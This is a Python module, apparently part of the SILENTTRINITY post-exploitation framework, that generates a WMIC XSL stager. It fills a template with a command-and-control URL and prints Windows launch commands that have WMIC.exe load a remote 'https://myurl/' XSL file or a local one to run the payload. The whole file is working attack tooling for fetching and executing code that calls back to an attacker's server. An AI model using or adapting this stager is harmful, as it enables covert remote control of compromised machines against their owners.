from core.utils import print_good, print_info


class STStager:
    def __init__(self):
        self.name = 'wmic'
        self.description = 'Stage via wmic XSL execution'
        self.author = '@byt3bl33d3r'
        self.options = {
            'rhost': {
                'Description': "The trinity server host address (defaults to listener bind IP)",
                'Required'   : False,
                'Value'      : None
            },
            'rport': {
                'Description': "The trinity server host port (defaults to listener bind port)",
                'Required'   : False,
                'Value'      : None
            },
        }

    def generate(self, listener, filename=None, as_string=False):
        stager_filename = filename if filename is not None else 'wmic.xsl'
        remote_host = self.options['rhost']['Value'] or listener['BindIP']
        remote_port = self.options['rport']['Value'] or listener['Port']
        c2_url = f"{listener.name}://{remote_host}:{remote_port}"

        with open('stagers/templates/wmic.xsl') as template_fd:
            template = template_fd.read()
            template = template.replace("C2_URL", c2_url)

        if not as_string:
            with open(stager_filename, 'w') as stager:
                stager.write(template)
                print_good(f"Generated stager to {stager.name}")
                print_info("Launch with:")
                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")
        else:
            return template
